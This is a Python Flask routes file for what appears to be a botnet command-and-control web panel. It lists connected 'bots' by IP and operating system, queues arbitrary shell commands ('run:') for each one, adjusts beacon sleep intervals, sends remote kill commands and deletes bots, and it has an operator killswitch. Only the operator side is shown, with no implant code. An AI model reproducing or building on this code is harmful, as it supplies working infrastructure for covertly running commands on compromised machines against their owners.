from app import app, master, db
from flask import render_template, g, abort, request
from flask.ext.security import current_user, login_required
from app.forms import RunCommand, SetSleepInterval
from threading import Thread
from app.models import Bot
import json

@app.before_first_request
def before_first():
    """right before the first request is made the master server is started"""
    master.main()

@app.before_request
def before_request():
    """Update queue and user in the app and check the app killswitch"""
    if app.killswitch:
        abort(500)
    g.queue = master.queue
    g.user = current_user

@app.route('/')
@app.route('/home')
@app.route('/index')
def index():
    return render_template("index.html", title="Home")

@app.route('/kill')
@login_required
def kill():
    """Kills the application until the server is restarted"""
    app.killswitch = 1
    abort(500)

@app.route("/api/clients/list", methods=["GET"])
@login_required
def api_clients_list():
    """Generates json data for all active bots"""
    bots = Bot.query.all()
    data = {}
    for bot in bots:
        if bot.last_command is None and bot.os is None:
            if bot.last_seen > 10000:
                db.session.delete(bot)
                db.session.commit()
            continue
        if bot.ip not in g.queue.keys():
            g.queue[bot.ip] = list()
        data[bot.id] = dict()
        data[bot.id]["IP"] = bot.ip
        data[bot.id]["OS"] = bot.os
        data[bot.id]["last_seen"] = bot.last_seen
        data[bot.id]["last_command"] = bot.last_command
        data[bot.id]["current_command"] = bot.current_command
        data[bot.id]["last_response"] = bot.last_response
        data[bot.id]["set_interval"] = bot.sleep_interval
        if bot.ip in g.queue.keys():
            data[bot.id]["cmd_queue"] = g.queue[bot.ip]
        else: data[bot.id]["cmd_queue"] = []
    return json.dumps(data)

@app.route("/api/clients/cmd/<int:id>", methods=["POST"])
@login_required
def api_clients_cmd(id):
    """Adds a command to a bot's command queue"""
    data = json.loads(request.get_data())
    bot = Bot.query.filter_by(id=id).one()
    g.queue[bot.ip].append("run:"+data['cmd'])
    return "", 200

@app.route("/api/clients/clearq/<int:id>")
@login_required
def api_clients_clearq(id):
    """Deletes all entries in a bot's queue"""
    bot = Bot.query.filter_by(id=id).one()
    del g.queue[bot.ip][:]
    return "", 200

@app.route("/api/clients/sleep/<int:id>", methods=["POST"])
@login_required
def api_clients_sleep(id):
    """Adds a set sleep command to a bot's command queue"""
    data = json.loads(request.get_data())
    try: int(data['interval'])
    except: return "", 500
    bot = Bot.query.filter_by(id=id).one()
    g.queue[bot.ip].append("set sleep:"+data['interval'])
    bot.sleep_interval = int(data['interval'])
    db.session.add(bot)
    db.session.commit()
    return "", 200

@app.route("/api/clients/kill/<int:id>")
@login_required
def api_clients_kill(id):
    """Add the kill command to a bot's command queue"""
    try:
        bot = Bot.query.filter_by(id=id).one()
    except: return "", 500
    g.queue[bot.ip].insert(0, "killkillkill")
    return "", 200

@app.route("/api/clients/delete/<int:id>")
@login_required
def api_clients_delete(id):
    try:
        bot = Bot.query.filter_by(id=id).one()
    except: return "", 500
    del g.queue[bot.ip]
    db.session.delete(bot)
    db.session.commit()
    return "", 200

@app.route("/bots")
@login_required
def bots():
    """Queries for all active bots and renders the bot page"""
    bots = [ x for x in Bot.query.all() if x.last_command is not None and x.os is not None ]
    cmd_form = RunCommand()
    int_form = SetSleepInterval()
    return render_template("bots.html", title="Bots", cmd_form=cmd_form, int_form=int_form, bots=bots)

@app.errorhandler(404)
def err404(e):
    return render_template("404.html", title="Stop it.")

@app.errorhandler(500)
def err500(e):
    return render_template("500.html", title="..........")
